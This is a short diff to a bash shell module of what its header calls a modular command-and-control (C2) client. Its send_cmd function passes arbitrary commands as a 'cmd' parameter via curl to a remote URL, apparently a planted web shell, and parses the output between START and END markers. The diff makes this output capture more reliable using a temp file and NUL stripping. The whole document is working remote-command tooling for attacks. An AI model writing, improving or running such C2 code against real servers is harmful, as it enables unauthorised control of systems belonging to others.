@@ -1,6 +1,5 @@
 #!/usr/bin/env bash
 # Lightweight shell module for the modular C2 client.
-# English inline comments added; original code logic is left unchanged.
 
 # Initialize the module.
 # Expects a URL as the first argument and returns error if not provided.
@@ -26,14 +25,15 @@ send_cmd() {
   # Wrap the command so the remote side prints START and END markers
   local wrapped_cmd="echo START; $cmd; echo END"
   local out
+  local tmp
+  tmp=$(mktemp) || { echo "[!] mktemp failed"; return 1; }
   # Use curl to send a GET request with the URL-encoded 'cmd' parameter
-  out=$(curl -s --get --data-urlencode "cmd=$wrapped_cmd" "$URL")
+  curl -s --get --data-urlencode "cmd=$wrapped_cmd" "$URL" > "$tmp"
+  out=$(tr -d '\000' <"$tmp")
   # Remove everything before the START marker
   out="${out#*START}"
   # Remove everything after the END marker
   out="${out%%END*}"
-
-  # === Trim leading and trailing newlines only ===
   # Remove leading newlines
   while [[ "${out:0:1}" == $'\n' ]]; do
     out="${out:1}"
